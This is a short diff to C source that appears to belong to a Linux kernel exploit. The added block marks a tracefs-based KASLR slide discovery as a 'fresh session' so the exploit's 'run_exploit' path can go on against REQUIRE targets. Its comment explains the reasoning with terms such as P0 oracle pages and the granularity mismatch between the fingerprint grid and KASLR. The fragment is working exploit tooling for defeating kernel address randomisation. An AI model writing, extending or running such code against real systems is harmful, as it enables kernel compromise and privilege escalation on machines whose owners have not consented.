@@ -647,6 +647,15 @@ out:
     return 0;
   }
   pr_success("slide tracefs caller gate candidate=%08zx\n", candidate);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  /* In-process quorum discovery satisfies the full-route freshness gate in
+   * run_exploit: the slide is from this boot and this process, and the
+   * alias verifier below prepares its own fresh P0 oracle pages per
+   * attempt. Without this, REQUIRE targets can never take the tracefs
+   * path (physical-scan fingerprint grid is 0x10000 while this KASLR is
+   * 0x8000-granular). */
+  slide_p0_session_fresh = 1;
+#endif
   return slide_commit_stext(KIMAGE_TEXT_BASE + candidate, "tracefs");
 }
 #endif
